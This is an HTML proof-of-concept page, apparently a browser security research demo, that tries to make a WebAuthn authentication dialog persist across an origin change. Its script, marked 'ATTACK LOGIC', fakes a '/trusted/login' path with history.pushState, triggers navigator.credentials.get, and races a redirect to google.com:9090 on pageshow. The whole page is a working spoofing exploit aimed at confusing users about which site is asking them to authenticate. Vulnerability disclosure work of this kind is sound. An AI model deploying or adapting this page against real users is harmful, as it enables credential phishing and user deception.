<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>WebAuthn Dialog Persistence PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
.notice{margin-top:14px;font-size:13px;color:#b00020}
</style>
</head>

<body>

<h2 style="margin-top:60px;">WebAuthn Dialog Persistence PoC</h2>
<p>Observe authentication dialog during navigation</p>

<button id="start">Start PoC</button>

<div id="panel">
  <h3>Trigger WebAuthn</h3>
  <p>Authentication dialog appears during pending navigation</p>
  <button onclick="triggerWebAuthn()">🔐 Authenticate</button>
  <p id="output">Result: -</p>
  <div class="notice">
    Demo only — dialog may persist while origin changes
  </div>
</div>

<script>
const panel  = document.getElementById('panel');
const output = document.getElementById('output');

/* ================= WEBAUTHN ================= */
function triggerWebAuthn(){
  if(!window.PublicKeyCredential){
    output.textContent = 'WebAuthn not supported';
    return;
  }

  const challenge = new Uint8Array(32);
  crypto.getRandomValues(challenge);

  navigator.credentials.get({
    publicKey: {
      challenge,
      timeout: 60000,
      userVerification: "preferred"
    }
  }).then(() => {
    output.textContent = 'WebAuthn completed';
  }).catch(err => {
    output.textContent = 'WebAuthn error / cancelled';
  });
}

/* ================= ATTACK LOGIC ================= */
/* Step 1: Fake trusted path */
document.getElementById('start').onclick = () => {
  history.pushState({}, '', '/trusted/login');
  panel.style.display = 'block';
};

/* Step 2: Navigation race (TARGET DI AKHIR) */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090/#https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
